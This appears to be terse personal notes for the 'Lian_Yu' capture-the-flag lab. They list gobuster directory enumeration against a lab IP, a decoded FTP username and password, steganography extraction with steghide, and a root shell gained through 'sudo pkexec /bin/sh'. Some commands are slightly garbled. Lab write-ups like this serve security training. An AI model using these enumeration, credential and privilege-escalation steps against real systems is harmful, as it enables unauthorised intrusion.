# Lian_Yu
```
export_IP = 10.10.93.97
```

# Enumerate Web
```
1. gobuster dir -w {*/dirbuster-medium-2.3.txt) -u http://export_ip/
:island

2. gobuster dir -w {*/dirbuster-medium-2.3.txt) -u http://export_ip/island
: 2100

3. gobuster dir -w {*/dirbuster-medium-2.3.txt) -u http://export_ip/island/2100
: green_arrow.ticket
```

# Gain Access
```
1.FTP Access 
: RTy8yhBQdscX
: Base 58 Decode
: RTy8yhBQdscX
-> FTP :  (vigilante,!#th3h00d)

2. SSH Access
: Login Id -> FTP Get
: Login Password -> aa.zip 
 -> PNG Header Edit file :  Leave_me_alone.png
 -> steghide extract -sf aa.jpg 
```


# Privilege Escalate
```
1. sudo -l
: sudo /usr/bin/pkexec /bin/sh

```